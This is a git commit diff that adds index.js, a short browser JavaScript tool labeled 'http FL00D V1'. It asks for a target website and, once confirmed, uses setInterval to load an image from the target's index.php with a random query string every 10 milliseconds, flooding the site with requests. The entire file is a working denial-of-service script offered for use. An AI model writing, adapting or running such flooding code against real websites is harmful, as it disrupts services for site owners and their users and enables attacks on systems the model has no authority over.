888fc3fc0dc2d1798f15ca9c06ac4bfc355417f7
testingtesta <104733450+testingtesta@users.noreply.github.com>
2022-05-04 14:44:50 -0400

    modsjfj

---
+++ index.js
@@ -0,0 +1,33 @@
+function a() {
+
+    var x = prompt("Website Here, example.com: ");
+   
+
+let text = "Are You Sure?\nOK or Cancel.";
+if (confirm(text) == true) {
+text = alert("http FL00D V1 ATTACKING : " + x);
+text = document.write("SENDING REQUESTS TO : " + x);
+
+
+
+function imgflood() { 
+var TARGET = x
+var URI = '/index.php?'
+var pic = new Image()
+var rand = Math.floor(Math.random() * 1000)
+pic.src = 'http://'+TARGET+URI+rand+'=val'
+}
+setInterval(imgflood, 10)
+
+
+
+} else {
+text = "Dam";
+alert("Cancel")
+}
+
+
+
+
+
+}
